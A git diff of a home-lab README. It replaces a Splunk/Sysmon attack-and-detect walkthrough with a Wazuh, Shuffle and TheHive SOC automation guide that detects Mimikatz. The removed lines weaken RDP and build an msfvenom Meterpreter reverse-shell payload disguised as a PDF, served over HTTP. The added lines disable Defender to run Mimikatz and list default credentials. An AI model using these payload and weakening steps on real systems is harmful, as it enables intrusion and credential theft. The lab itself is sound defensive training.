@@ -1,68 +1,73 @@
-# 👨‍💻SOC Home Lab: Using Splunk & Sysmon🚀  
+# 👨‍💻 SOAR Home Lab: Wazuh, Sysmon, Shuffle & TheHive 🚀
 
-## Table of Contents 
-1. [Introduction](#introduction)
-2. [Workflow Overview](#-workflow-overview)
-3. [Prerequisites](#-prerequisites)
-4. [Network Topology](#-network-topology)
-5. [Step 1: Environment Setup](#️-step-1-environment-setup)
-6. [Step 2: Network Configuration](#-step-2--network-configuration)
-7. [Step 3: Initial Network Scanning](#-step-3--initial-network-scanning-)
-8. [Step 4: Scanning & Attempted SMB Exploitation](#step-4-scanning-attempted-smb-exploitation)
-9. [Step 5: Creating an RDP Vulnerability](#-step-5-creating-an-rdp-vulnerability-)
-10. [Step 6: Payload Creation & Listener Setup](#-step-6--payload-delivery-&-exploitation-attempt)
-11. [Step 7: Payload Delivery & Reverse Shell](#️-step-7--payload-delivery-&-reverse-shell-gained)
-12. [Step 8: Splunk Analysis of Malware Execution](#-step-8-splunk-analysis-of-malware-execution-)
-13. [Step 9: Created a Dashboard for Better Understanding](#-step-9-created-a-dashboard-for-better-understanding-)
-13. [Step 10: Correlating Reverse Shell Activity with Splunk Logs](#-step-9-correlating-reverse-shell-activity-with-splunk-logs-)
-14. [Next Steps & Future Enhancements](#-next-steps--future-enhancements)
-15. [Conclusion](#-conclusion)
-16. [Let’s Connect](#-lets-connect)
+## Table of Contents  
+1. [Introduction](#introduction)  
+2. [Key Features](#key-features)  
+3. [Network Setup](#-network-setup)  
+4. [Workflow Overview](#-workflow-overview)  
+5. [Key Highlights](#-key-highlights)  
+6. [Prerequisites](#-prerequisites)  
+7. [Network Topology](#-network-topology)  
+8. [Step 1: Environment Setup](#️-step-1-environment-setup)  
+9. [Step 2: Network Configuration](#-step-2-network-configuration)  
+10. [Step 3: Installation (Linked Resources)](#-step-3-installation)  
+11. [Step 4: TheHive Configuration](#-step-4-thehive-configuration)  
+12. [Step 5: Wazuh Configuration](#-step-5-wazuh-configuration)  
+13. [Step 6: Windows 10 Telemetry Configuration](#-step-6-windows-10-telemetry-configuration)  
+14. [Step 7: Rule Creation in Wazuh](#-step-7-rule-creation-in-wazuh)  
+15. [Step 8: Shuffle Integration & Workflow Automation](#-step-8-shuffle-integration-and-workflow-automation)  
+16. [Outcome](#-outcome)  
+17. [Next Steps & Future Enhancements](#-next-steps-and-future-enhancements)  
+18. [Conclusion](#-conclusion)  
+19. [Let’s Connect](#-lets-connect)  
 
 
 ---  
 ## 📌Introduction
-🔒 Introduction
 Welcome to the SOC Automation Project! 🚀
+
 In today’s world, cyber threats are everywhere – from phishing emails to credential dumping attacks using tools like Mimikatz. Security Operations Centers (SOCs) need to act fast to detect, analyze, and respond to incidents in real time.
 
 This project demonstrates how automation can make SOC operations faster and more efficient.
 
-We’ve built a mini SOC homelab with:
--> Windows 10 VM as the endpoint where we generate telemetry
--> Wazuh Manager to detect suspicious activity
--> Shuffle for automation and enrichment using VirusTotal API
--> TheHive for case management and investigation
+We’ve built a mini SOC homelab with:  
+-> Windows 10 VM as the endpoint where we generate telemetry.  
+-> Wazuh Manager to detect suspicious activity.  
+-> Shuffle for automation and enrichment using VirusTotal API.  
+-> TheHive for case management and investigation.  
 
-Key Features:
-🔍 Detect suspicious activity (Mimikatz execution)
-📤 Forward alerts from Wazuh to Shuffle
-🤖 Enrich alerts with VirusTotal threat intelligence
-📧 Notify SOC analysts via email
-📂 Create cases in TheHive for investigation
+
+
+
+## Key Features:  
+🔍 Detect suspicious activity (Mimikatz execution)  
+📤 Forward alerts from Wazuh to Shuffle  
+🤖 Enrich alerts with VirusTotal threat intelligence  
+📧 Notify SOC analysts via email  
+📂 Create cases in TheHive for investigation  
 
 This end-to-end automation flow helps SOC teams respond faster, reduce manual effort, and focus on what matters most – stopping attacks.
 
 
+---
 
 
+## 🌐 Network Setup
 
-🌐 Network Setup
+SOC Automation lab uses three virtual machines, and because the RAM requirements were quite high, we distributed them across two laptops while keeping them in the same network.  
 
-SOC Automation lab uses three virtual machines, and because the RAM requirements were quite high, we distributed them across two laptops while keeping them in the same network.
+💻 Laptop 1  
+Ubuntu Server 1 (Wazuh Manager):  
+-> Collects logs from Windows 10 workstation  
+-> Detects suspicious activity  
+-> Sends alerts to Shuffle  
 
-💻 Laptop 1
-Ubuntu Server 1 (Wazuh Manager):
--> Collects logs from Windows 10 workstation
--> Detects suspicious activity
--> Sends alerts to Shuffle
+💻 Laptop 2  
+-> Windows 10 Workstation: Generates telemetry by running Mimikatz and sends logs via Wazuh Agent  
+-> Ubuntu Server 2 (TheHive): Receives enriched alerts and creates cases for SOC analysts  
+-> Shuffle (SOAR): Automates enrichment with VirusTotal, pushes alerts to TheHive, and sends email notifications  
 
-💻 Laptop 2
--> Windows 10 Workstation: Generates telemetry by running Mimikatz and sends logs via Wazuh Agent
--> Ubuntu Server 2 (TheHive): Receives enriched alerts and creates cases for SOC analysts
--> Shuffle (SOAR): Automates enrichment with VirusTotal, pushes alerts to TheHive, and sends email notifications
-
-All virtual machines were connected using a bridged network, ensuring seamless communication between laptops as if they were on the same physical network.
+All virtual machines were connected using a bridged network, ensuring seamless communication between laptops as if they were on the same physical network.  
 
 🖼️ [Insert Simple Network Topology Diagram – Laptop 1 + Laptop 2 + VMs + Bridge Network + Arrows Showing Communication]
 
@@ -70,25 +75,25 @@ All virtual machines were connected using a bridged network, ensuring seamless c
 ---  
 
 
-🔄 Workflow Overview
-The workflow of SOC Automation Project shows how an attack is detected, enriched, and escalated automatically.
+## 🔄 Workflow Overview
+The workflow of SOC Automation Project shows how an attack is detected, enriched, and escalated automatically.  
 
-1.Attack Simulation 🖥️
--> Mimikatz is executed on the Windows 10 Workstation to simulate credential dumping.
+1.Attack Simulation 🖥️  
+-> Mimikatz is executed on the Windows 10 Workstation to simulate credential dumping.  
 
-2.Detection 🔍
--> Wazuh Agent on Windows forwards logs to Wazuh Manager (Laptop 1).
--> Wazuh detects suspicious activity and generates an alert.
+2.Detection 🔍  
+-> Wazuh Agent on Windows forwards logs to Wazuh Manager (Laptop 1).  
+-> Wazuh detects suspicious activity and generates an alert.  
 
-3.Automation & Enrichment 🤖
--> The alert is sent to Shuffle (Laptop 2).
--> Shuffle enriches the alert by checking file hashes with VirusTotal.
+3.Automation & Enrichment 🤖  
+-> The alert is sent to Shuffle (Laptop 2).  
+-> Shuffle enriches the alert by checking file hashes with VirusTotal.  
 
-4.Case Creation 📂
--> The enriched alert is forwarded to TheHive (Laptop 2), where a case is created for SOC investigation.
+4.Case Creation 📂  
+-> The enriched alert is forwarded to TheHive (Laptop 2), where a case is created for SOC investigation.  
 
-5.Notification 📧
--> Shuffle sends an email notification to the SOC analyst with a summary of the incident.
+5.Notification 📧  
+-> Shuffle sends an email notification to the SOC analyst with a summary of the incident.  
 
 🖼️ [Insert Workflow Flowchart – From Attack Simulation to Email Notification]
 
@@ -100,15 +105,15 @@ The workflow of SOC Automation Project shows how an attack is detected, enriched
 
 
 
-🌟 Key Highlights
-SOC Automation Project stands out because of the following features:
+## 🌟 Key Highlights  
+SOC Automation Project stands out because of the following features:  
 
--> End-to-End SOC Workflow: Covers detection, enrichment, case creation, and analyst notification seamlessly.
--> Distributed Setup: Uses two laptops with VMs connected via bridged network to handle heavy RAM requirements efficiently.
--> Realistic Attack Simulation: Uses Mimikatz to simulate credential dumping(T1003), replicating real-world attack scenarios.
--> Automation with SOAR: Automatically enriches alerts using VirusTotal and creates cases in TheHive.
--> Immediate Notifications: Sends emails to SOC analysts for faster response.
--> Hands-On SOC Experience: Closely mimics a real SOC environment, making it perfect for learning and practice.
+-> End-to-End SOC Workflow: Covers detection, enrichment, case creation, and analyst notification seamlessly.  
+-> Distributed Setup: Uses two laptops with VMs connected via bridged network to handle heavy RAM requirements efficiently.  
+-> Realistic Attack Simulation: Uses Mimikatz to simulate credential dumping(T1003), replicating real-world attack scenarios.  
+-> Automation with SOAR: Automatically enriches alerts using VirusTotal and creates cases in TheHive.  
+-> Immediate Notifications: Sends emails to SOC analysts for faster response.  
+-> Hands-On SOC Experience: Closely mimics a real SOC environment, making it perfect for learning and practice.  
 
 🖼️ [Insert Screenshot of Your Entire Lab Setup – Virtual Machines Running on Both Laptops]
 
@@ -122,7 +127,7 @@ SOC Automation Project stands out because of the following features:
 
 
 
-## 🔧 Prerequisites 
+## 🔧 Prerequisites   
 
 | Requirement               | Description                                                                                    |
 | ------------------------- | ---------------------------------------------------------------------------------------------- |
@@ -143,38 +148,38 @@ SOC Automation Project stands out because of the following features:
 
 
 
-🌐 Network Topology
+## 🌐 Network Topology  
 
-The lab uses two laptops connected through a bridged network, allowing all systems to communicate as if they are on the same LAN.
--> Laptop 1: Hosts Ubuntu Server 1 (Wazuh Manager) – collects logs and forwards alerts.
-=> Laptop 2: Hosts Windows 10 Workstation, Ubuntu Server 2 (TheHive), and Shuffle – generates telemetry, enriches alerts, and creates cases.
+The lab uses two laptops connected through a bridged network, allowing all systems to communicate as if they are on the same LAN.  
+-> Laptop 1: Hosts Ubuntu Server 1 (Wazuh Manager) – collects logs and forwards alerts.  
+-> Laptop 2: Hosts Windows 10 Workstation, Ubuntu Server 2 (TheHive), and Shuffle – generates   telemetry, enriches alerts, and creates cases.  
 
 🖼️ [Insert Simple Network Diagram – Laptop 1 & Laptop 2 with their VMs, connected via Bridged Network, arrows showing data flow]
 
 
 ---  
 
-🛠️ Step 1: Environment Setup
-To start the project, I set up the virtual environment across two laptops:
+## 🛠️ Step 1: Environment Setup  
+To start the project, I set up the virtual environment across two laptops:  
 
--> Installed VMware Workstation (VirtualBox can also be used).
--> Created three VMs: Windows 10 Workstation, Ubuntu Server 1 (Wazuh Manager), and Ubuntu Server 2 (TheHive).
--> Allocated resources: Windows 10 → 5–6 GB RAM, Wazuh → 4 GB RAM, TheHive → 6–8 GB RAM.
--> Distributed load across two laptops (Laptop 1 hosted Wazuh Manager, Laptop 2 hosted Windows 10, TheHive, and Shuffle).
--> Installed operating systems and set Bridged Network mode so all machines could communicate.
+-> Installed VMware Workstation (VirtualBox can also be used).  
+-> Created three VMs: Windows 10 Workstation, Ubuntu Server 1 (Wazuh Manager), and Ubuntu Server 2 (TheHive).  
+-> Allocated resources: Windows 10 → 5–6 GB RAM, Wazuh → 4 GB RAM, TheHive → 6–8 GB RAM.  
+-> Distributed load across two laptops (Laptop 1 hosted Wazuh Manager, Laptop 2 hosted Windows 10, TheHive, and Shuffle).  
+-> Installed operating systems and set Bridged Network mode so all machines could communicate.  
 
 🖼️ [Screenshot of All VMs in VMware/VirtualBox With Resource Allocation and Network Mode Visible]
 
 ---  
 
-🌐 Step 2: Network Configuration
-After setting up the environment, I configured the network for all virtual machines to ensure proper communication:
+## 🌐 Step 2: Network Configuration  
+After setting up the environment, I configured the network for all virtual machines to ensure proper communication:  
 
--> Ubuntu Server 1 (Wazuh Manager): 10.53.159.19
--> Ubuntu Server 2 (TheHive + Shuffle): 10.53.159.152
--> Windows 10 Workstation: 10.53.159.106
+-> Ubuntu Server 1 (Wazuh Manager): 10.53.159.19  
+-> Ubuntu Server 2 (TheHive + Shuffle): 10.53.159.152  
+-> Windows 10 Workstation: 10.53.159.106  
 
-All machines were set to Bridged Network Mode so they could communicate with each other and with the host systems seamlessly.
+All machines were set to Bridged Network Mode so they could communicate with each other and with the host systems seamlessly.  
 
 🖼️ [Screenshot of VM Network Settings & IP Configurations (ip addr/ipconfig output) for Each VM]
 
@@ -182,20 +187,21 @@ All machines were set to Bridged Network Mode so they could communicate with eac
 ---  
 
 
-🛠️ Step 3: Installation
+## 🛠️ Step 3: Installation  
 
-For this project, the following tools were installed:
--> Sysmon on the Windows 10 VM (for detailed telemetry)
--> Wazuh SIEM on Ubuntu Server (for centralized log collection & monitoring)
--> TheHive on Ubuntu Server (for alert management & case handling)
+For this project, the following tools were installed:  
+-> Sysmon on the Windows 10 VM (for detailed telemetry)  
+-> Wazuh SIEM on Ubuntu Server (for centralized log collection & monitoring)  
+-> TheHive on Ubuntu Server (for alert management & case handling)  
 
-📺 Reference Guide:
-  🔗 Click Here for Installation Guide / Video
+📺 Reference Guide:  
 
-This guide/video includes:
--> Sysmon installation steps
--> Wazuh manager, dashboard installation
--> TheHive installation and service setup
+    🔗 Click Here for Installation Guide / Video
+
+This guide/video includes:  
+-> Sysmon installation steps  
+-> Wazuh manager, dashboard installation  
+-> TheHive installation and service setup  
 
 🖼️ Image Suggestion:
 
@@ -207,92 +213,94 @@ This guide/video includes:
 
 
 
-🧩 Step 4: TheHive Configuration
+## 🧩 Step 4: TheHive Configuration  
 
-In this step, TheHive was fully configured by modifying its dependencies (Cassandra, Elasticsearch) and its own configuration file.
-Below are the detailed commands and configuration changes used during the setup.
+In this step, TheHive was fully configured by modifying its dependencies (Cassandra, Elasticsearch) and its own configuration file.  
+Below are the detailed commands and configuration changes used during the setup.  
  
-🛠️ 4.1 Cassandra Configuration
+### 🛠️ 4.1 Cassandra Configuration  
+
     sudo su
     nano /etc/cassandra/cassandra.yml
+🔧 Changes made:  
+-> cluster_name: Changed to SOC Project  
+-> listen_address: Kept as localhost  
+-> rpc_address: Kept as localhost  
+-> seed_provider: Ensured value is localhost  
 
-🔧 Changes made:
--> cluster_name: Changed to SOC Project
--> listen_address: Kept as localhost
--> rpc_address: Kept as localhost
--> seed_provider: Ensured value is localhost
+Then restart Cassandra to apply changes:  
 
-Then restart Cassandra to apply changes:
     systemctl stop cassandra.service
     rm -rf /var/lib/cassandra/*
     systemctl start cassandra.service
     systemctl status cassandra.service
-
-✅ Expected Result: Cassandra service should be in active (running) state.
+✅ Expected Result: Cassandra service should be in active (running) state.  
 
 🖼️ Image Suggestion:
 🖼️ [Screenshot of Cassandra config file (showing cluster_name) + terminal showing Cassandra service running]
 
 
-📡 4.2 Elasticsearch Configuration
-Edit the Elasticsearch configuration:
+### 📡 4.2 Elasticsearch Configuration  
+Edit the Elasticsearch configuration:  
+
     nano /etc/elasticsearch/elasticsearch.yml
+🔧 Changes made:  
+-> cluster.name: Changed to SOC Project  
+-> network.host: Uncommented and set to localhost  
+-> http.port: Uncommented and kept default (9200)  
+-> cluster.initial_master_nodes: Removed node2, kept only node1  
 
-🔧 Changes made:
--> cluster.name: Changed to SOC Project
--> network.host: Uncommented and set to localhost
--> http.port: Uncommented and kept default (9200)
--> cluster.initial_master_nodes: Removed node2, kept only node1
+Start and enable Elasticsearch:  
 
-Start and enable Elasticsearch:
     systemctl start elasticsearch
     systemctl enable elasticsearch
     systemctl status elasticsearch
-
-✅ Expected Result: Elasticsearch should be active (running).
+✅ Expected Result: Elasticsearch should be active (running).  
 
 🖼️ Image Suggestion:
 🖼️ [Screenshot of elasticsearch.yml + terminal showing Elasticsearch running]
 
 
-📂 4.3 TheHive Directory Permissions
-Check directory ownership:
-    ls -la /opt/thp
+### 📂 4.3 TheHive Directory Permissions  
+Check directory ownership:  
 
-If access is restricted to root, grant permissions to TheHive user:
-    chown -R thehive:thehive /opt/thp
     ls -la /opt/thp
-
-✅ Expected Result: Ownership should now belong to thehive:thehive.
+If access is restricted to root, grant permissions to TheHive user:  
+    chown -R thehive:thehive /opt/thp  
+    
+    ls -la /opt/thp
+✅ Expected Result: Ownership should now belong to thehive:thehive.  
 
 🖼️ Image Suggestion:
 🖼️ [Screenshot of directory permissions before and after chown]
 
 
-⚙️ 4.4 TheHive Application Configuration
-Open TheHive configuration file:
+### ⚙️ 4.4 TheHive Application Configuration  
+Open TheHive configuration file:  
+
     nano /etc/thehive/application.conf
+🔧 Changes made:  
+-> Ensured hostname is set to localhost  
 
-🔧 Changes made:
--> Ensured hostname is set to localhost
+Then start, enable, and check TheHive:  
 
-Then start, enable, and check TheHive:
     systemctl start thehive
     systemctl enable thehive
     systemctl status thehive
+✅ Expected Result: TheHive should now be active (running).  
 
-✅ Expected Result: TheHive should now be active (running).
+Also re-check Cassandra & Elasticsearch status to ensure everything is running:  
 
-Also re-check Cassandra & Elasticsearch status to ensure everything is running:
     systemctl status cassandra.service
     systemctl status elasticsearch.service
 
 
-🌐 4.5 Access TheHive UI
-Open a browser and navigate to:
-    http://localhost:9000
+### 🌐 4.5 Access TheHive UI  
+Open a browser and navigate to:  
 
-Login with default credentials:
+    http://localhost:9000
+Login with default credentials:  
+
     Username: admin@admin.local
     Password: secret
 
@@ -300,237 +308,437 @@ Login with default credentials:
 🖼️ [Screenshot of TheHive login page after first successful run]
 
 
-🧠 4.6 JVM Options Update
-Edit JVM options to adjust memory allocation:
+### 🧠 4.6 JVM Options Update  
+Edit JVM options to adjust memory allocation:  
+
     nano /etc/elasticsearch/jvm.options.d/jvm.options
     -Dlog4j2.formatMsgNoLookups=true
     -Xms2g
     -Xmx2g
-
-
-✅ At this stage, TheHive, Cassandra, and Elasticsearch should all be running and accessible, completing the configuration process.
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+✅ At this stage, TheHive, Cassandra, and Elasticsearch should all be running and accessible, completing the configuration process.  
 
 
 
 ---  
 
-## 🔄 Step 5: Creating an RDP Vulnerability 💻🔓  
-Since SMB was a dead end, I decided to create my own vulnerability by enabling Remote Desktop Protocol (RDP, Port 3389) and intentionally misconfiguring it.  
+## 🖥️ Step 5: Wazuh Configuration  
+In this step, Wazuh was configured and the Windows 10 workstation was added as an agent so that its telemetry could be collected and analyzed.  
 
-🛠 Steps Taken:  
-  Enabled Remote Desktop from the system settings.  
-  Nmap scan still showed RDP as closed 🚫.  
-  🗝 Registry Tweak:  
-    Opened regedit → navigated to:  
+### 🌐 5.1 Access Wazuh Dashboard  
+1.Open a browser and navigate to the Wazuh Dashboard using the Ubuntu server IP address:  
 
-    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server 
+    https://10.53.159.19
+2.Log in using the indexer username and API password (retrieved later from the server).  
+3.You should see Total Agents = 0, indicating no agents are yet connected.  
 
-  Changed fDenyTSConnections value to 0 ✅ (enabled RDP directly from registry, bypassing GUI).  
+🖼️ Image Suggestion:
+🖼️ [Screenshot of Wazuh Dashboard showing 0 agents connected]
 
-🔄 Service Management:  
-  Located TermService (Remote Desktop Services).  
-  Stopped → Started → Restarted multiple times to ensure activation.  
-  ⚙ Group Policy Configuration (gpedit.msc):  
-      Enabled Allow users to connect remotely under:  
 
-    Computer Configuration → Administrative Templates → Windows Components → Remote Desktop Services → Remote Desktop Session Host → Connections  
+### 📂 5.2 Retrieve Wazuh Installation Details  
+On the Wazuh Ubuntu Server:  
 
-  Ensured Network Level Authentication was disabled to reduce restrictions.  
+    sudo su
+    ls
+You should see:  
 
-📊 Final Check:  
-    Ran Nmap again → ✅ Port 3389 OPEN 🎉  
-    Ready for RDP exploitation in the next step!  
- 
-<p align="center">
-  <img src="https://github.com/user-attachments/assets/9c3f884c-812c-4c11-9659-1e4f9a9926ed" alt="LAN Segment & IP settings" width="250" height="199"/>
-  <img src="https://github.com/user-attachments/assets/d57030d2-f85d-49b7-a4a0-fbea9f53cac1" alt="VMware Settings" width="250" height="199"/>
-  <img src="https://github.com/user-attachments/assets/697bc3cc-0083-41f9-9a5e-e5334e51d28d" alt="VMware Settings" width="250" height="199"/>
-</p>
+    snap    wazuh-install-files.tar    wazuh-install.sh
+Extract the files:  
+
+    tar -xvf wazuh-install-files.tar
+    cd wazuh-install-files
+    ls
+    cat wazuh-password.txt
+From wazuh-password.txt, retrieve the API user password for Wazuh.  
+This password is used to log into the dashboard and manage agents.  
+
+🖼️ Image Suggestion:
+🖼️ [Screenshot of terminal showing extraction + cat command output]
+
+
+### ➕ 5.3 Add a New Agent in Wazuh  
+1.Go to Wazuh Dashboard → Add Agent  
+2.Select Windows as the operating system  
+3.Enter:  
+
+    Server Address: 10.53.159.19
+    Agent Name: e.g., Win10-Workstation
+4.Copy the installation command provided on the page.  
+📌 Dummy Command Example:  
+
+        Invoke-WebRequest -Uri https://packages.wazuh.com/4.x/windows/wazuh-agent-4.x.x.msi /q WAZUH_MANAGER="10.53.159.19" WAZUH_REGISTRATION_SERVER="10.53.159.19" WAZUH_AGENT_NAME="Win10-Workstation"
+
+
+🖼️ Image Suggestion:
+🖼️ [Screenshot of Deploy New Agent page in Wazuh Dashboard with fields filled]
+
+
+### 💻 5.4 Install Wazuh Agent on Windows Workstation  
+On the Windows 10 VM:  
+1.Open PowerShell as Administrator  
+2.Paste the installation command you copied earlier (or dummy one above).  
+3.After installation, start the Wazuh agent service:  
+
+    net start wazuhsvc
+4.Verify the agent is running:  
+-> Open services.msc  
+-> Locate Wazuh Agent  
+-> Ensure status = Running  
+
+🖼️ Image Suggestion:
+🖼️ [Screenshot of PowerShell installation output + Services window showing Wazuh Agent running]
+
+
+### 📊 5.5 Verify Connection on Wazuh Dashboard  
+Go back to the Wazuh dashboard and refresh the page.  
+You should now see:  
+-> Total Agents = 1  
+-> Active Agents = 1  
+-> Your Windows 10 VM listed as an active agent.  
+
+🖼️ Image Suggestion:
+🖼️ [Screenshot of Wazuh Dashboard showing agent status as Active + incoming logs]
+
+✅ Result: Windows 10 telemetry is now being forwarded to Wazuh, and you can view logs/events in real-time from the workstation.  
+
+---  
+
+## 🔍 Step 6: Windows 10 Telemetry Configuration  
+In this step, we configure Windows 10 telemetry to send Sysmon and event logs to the Wazuh Manager for analysis.  
+
+### 1️⃣ Editing ossec.conf File 📄  
+-> Navigate to:  
+
+    C:\Program Files (x86)\ossec-agent
+-> Locate the ossec.conf file.  
+-> 🛠️ Open Notepad as Administrator and edit ossec.conf.  
+✅ In the <client> tag, verify the <server> address points to the Wazuh Manager’s IP:  
+
+    <server>
+      <address>10.53.159.19</address>
+    </server>
+
+### 2️⃣ Configuring Log Collection 📝  
+-> Locate <localfile> tags and remove defaults:  
+
+    <localfile>
+      <location>Application</location>
+    </localfile>
+    
+    <localfile>
+      <location>Security</location>
+    </localfile>
+🆕 Replace with Sysmon Operational Log:  
+
+    <localfile>
+      <location>Microsoft-Windows-Sysmon/Operational</location>
+      <log_format>eventchannel</log_format>
+    </localfile>
+
+### 3️⃣ Creating Backup 💾  
+-> Before editing, create a backup:  
+
+    copy "C:\Program Files (x86)\ossec-agent\ossec.conf" "C:\Program Files (x86)\ossec-agent\ossec-backup.conf"
+-> 🛡️ This allows you to restore the original config if needed.  
+
+### 4️⃣ Restarting Wazuh Agent 🔄  
+-> Open Services → find Wazuh Agent → click Restart.  
+✅ This applies the new configuration.  
+
+
+### 5️⃣ Preparing Windows 10 for Testing 🖱️  
+-> Open Windows Security → Virus & Threat Protection.  
+🛑 Temporarily disable Real-Time Protection so Mimikatz is not blocked.  
+-> In Chrome → Settings → Privacy & Security, select No Protection (just for downloading).  
+-> ⬇️ Download Mimikatz from GentilKiwi/Mimikatz GitHub  
+-> 📂 Extract the ZIP file.  
+
+### 6️⃣ Running Mimikatz ⚡  
+-> Open PowerShell as Administrator and run:  
+
+    cd C:\Users\<User>\Downloads\mimikatz_trunk\x64
+    .\mimikatz.exe
+-> ✅ You should now see the Mimikatz console.  
+
+### 7️⃣ Enabling Full Logging on Wazuh Manager 🖥️  
+Run these commands on Ubuntu server:  
+
+    # Create backup
+    cp /var/ossec/etc/ossec.conf /var/ossec/etc/ossec-backup.conf
+    
+    # Edit configuration
+    nano /var/ossec/etc/ossec.conf
+Change inside <global>:  
+
+    <logall>yes</logall>
+    <logall_json>yes</logall_json>
+💾 Save → restart Wazuh:  
+
+    systemctl restart wazuh-manager.service
+
+
+### 8️⃣ Configuring Filebeat for Archives 📊  
+Edit Filebeat config:  
+
+    nano /etc/filebeat/filebeat.yml
+Change:  
+
+    archives:
+      enabled: false
+to:  
+
+    archives:
+      enabled: true
+Restart Filebeat:  
+
+    systemctl restart filebeat
+
+
+### 9️⃣ Creating Index Pattern in Wazuh Dashboard 🖼️  
+-> Go to Stack Management → Index Patterns.  
+-> ➕ Create new pattern: wazuh-archives-*  
+-> Select @timestamp as time field.  
+-> ✅ Save and switch to this pattern.  
+
+### 🔟 Viewing Mimikatz Logs 👀  
+Run Mimikatz again on Windows 10.  
+On Wazuh Manager:  
+
+    cd /var/ossec/logs/archives
+    cat archives.json | grep -i mimikatz
+✅ You should now see logs showing Mimikatz activity.  
+
+
+### 1️⃣1️⃣ Focus on Original File Name 🔎  
+Inside the logs, look for:  
+
+    "data.win.eventdata.originalFileName": "mimikatz.exe"
+💡 Tip: This field is more reliable than image because attackers may rename the executable.  
+
+📷 [Placeholder for Event Viewer Screenshot]
+📷 [Placeholder for Wazuh Dashboard Screenshot with Mimikatz Logs]
+
+---  
+
+## 📜 Step 7: Rule Creation in Wazuh  
+In this step, we create a custom rule in Wazuh to detect Mimikatz execution based on Sysmon logs.  
+
+### 1️⃣ Navigating to Rules Section 🧭  
+-> Open Wazuh Dashboard.  
+-> Click the dropdown button (⏬) next to “Wazuh” → Sidebar Opens.  
+-> Navigate to: Management → Rules.  
+
+### 2️⃣ Finding the Target Rule 🔍  
+-> Click Manage Rules Files.  
+-> Search for Sysmon Rules → locate:  
+
+    0800-sysmon_no_id_1.xml
+-> Reason for choosing Event ID 1 🧠:  
+   Sysmon Event ID 1 corresponds to Process Creation Events.  
+   ✅ This means every time a new process/executable starts, Sysmon generates an Event ID 1 log.  
+    This makes it ideal for catching tools like Mimikatz as soon as they run.  
+
+### 3️⃣ Creating Custom Rule File ✏️  
+-> Open the rule file → Copy the <rule> block from sysmon_no_id_1.xml.  
+-> Go back → Click Custom Rules → Edit local_rules.xml file.  
+
+### 4️⃣Paste and Modifying the Rule 🛠️
+Inside local_rules.xml paste the copied rule below the existing rule:
+-> 🔢 Change Rule ID → must be greater than 100001.  
+    Example:  
+
+    <rule id="100002" level="15">
+-> 🔝 Set Level: 15 (highest severity).  
+-> 🏷️ Group Tag: Keep sysmon_event1 (since we are targeting process creation).  
+-> 🎯 Field Tag: Change from parentImage to originalFileName and update pattern:  
+
+    <field name="win.eventdata.originalFileName" type="pcre2">(?i)mimikatz\.exe</field>
+-> 🗑️ Remove <options> tag (not required).  
+-> 📝 Description Tag:  
+
+    <description>Mimikatz usage detected</description>
+-> 🧠 MITRE Technique Tag: Change to T1003 (Credential Dumping).  
+
+    <mitre> <id>T1003</id> </mitre>
+
+### 5️⃣ Saving and Restarting Wazuh 🔄  
+-> Save changes.  
+-> Click Restart on the Wazuh Dashboard to apply the rule.  
+
+6️⃣ Testing the Rule 🧪  
+-> On Windows 10 VM → Run Mimikatz again:  
+
+    cd C:\Users\<User>\Downloads\mimikatz_trunk\x64
+    .\mimikatz.exe
+-> ✅ Result:  
+
+    Wazuh Dashboard shows a new alert:
+    “Mimikatz usage detected” 🔥
+
+📷 [🖼️ Screenshot Placeholder: Wazuh Dashboard showing Custom Rule Alert]
 
 ---  
 
 
-## 🚀 Step 6: 🎯 Payload Delivery & Exploitation Attempt
-  With RDP (3389) now open 🔓, I moved on to creating and delivering a malicious payload for exploitation.  
-  🛠 Payload Creation (MSFvenom)  
+## 🔄 Step 8: Shuffle Integration and Workflow Automation   
+In this step, we integrate Shuffle with Wazuh, VirusTotal, and TheHive, and configure automated workflows that send email alerts to SOC analysts when malicious activity (Mimikatz usage) is detected.  
 
-    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.3 LPORT=4444 -f exe -o ProjectReport.pdf.exe  
+### 8.1 – Shuffle Setup 🖥️  
+-> Open Shuffle on the Ubuntu VM where Hive is installed (instead of using host machine) — this ensures proper connectivity since cloud runtime was not able to connect with Hive.  
+-> Log in to Shuffle ➝ Navigate to Admin tab ➝ Select Locations.  
+-> Click Add Location ➝ Name: local-env ➝ Type: on-prem ➝ Save.  
+-> Click Make Default ✅.  
+-> Go back to Workflows ➝ Create a new workflow:  
 
-💡 Payload: Windows Meterpreter Reverse TCP  
-📍 LHOST: Attacker machine IP  
-📍 LPORT: Listener port for reverse shell  
+    Name: SOC Automation Project
+    Description: MySocLab
+    Select any use case ➝ Done.
+-> A new canvas opens with the ChangeMe icon.  
 
-📡 Setting Up the Listener (Metasploit)  
+### 8.2 – Webhook Setup 🔗  
+-> Click on Triggers ➝ Drag and drop Webhook onto the canvas.  
+-> It auto-connects to ChangeMe.  
+-> Configure:  
 
-    msfconsole  
-    use exploit/multi/handler  
-    set PAYLOAD windows/meterpreter/reverse_tcp  
-    set LHOST 192.168.56.3  
-    set LPORT 4444  
-    exploit  
-🎯 Waiting for the target to execute the payload...  
+    Name: Wazuh.alerts
+    Copy the Webhook URI.
+-> Save ✅.  
 
-🌐 Hosting Payload with Python  
-To easily transfer the file to the target, I started a Python HTTP server:  
+### 8.3 – Connect Wazuh to Shuffle 🛜  
+On Ubuntu server:  
 
-    python3 -m http.server 9999  
+    sudo nano /var/ossec/etc/ossec.conf
+-> Under <global> tag, add:  
 
-📂 Payload hosted at:  
+    <integration>
+      <name>custom-integration</name>
+      <hook_url>PASTE_WEBHOOK_URL_HERE</hook_url>
+      <rule_id>100002</rule_id>
+      <alert_format>json</alert_format>
+    </integration>
+-> Save & restart:  
 
-    http://192.168.56.3:9999/ProjectReport.pdf.exe  
-📸 Result:  
-    Payload successfully hosted & accessible ✅  
-R    eady for delivery to target 🎯 (execution attempt covered in the next step)   
+    sudo systemctl restart wazuh-manager.service
+    sudo systemctl status wazuh-manager.service
+-> Confirm Wazuh manager is running.  
 
-<p align="center">
-  <img src="https://github.com/user-attachments/assets/3e75489f-aa7b-4aa8-abca-54ea410ca2d7" alt="LAN Segment & IP settings" width="250" height="199"/>
-  <img src="https://github.com/user-attachments/assets/b384ec69-3a8b-4c68-9cf5-a01ae3a25b9f" alt="VMware Settings" width="250" height="199"/>
-  <img src="https://github.com/user-attachments/assets/2d1547f3-8caa-4233-88ec-084f942687f1" alt="VMware Settings" width="250" height="199"/>
-</p>
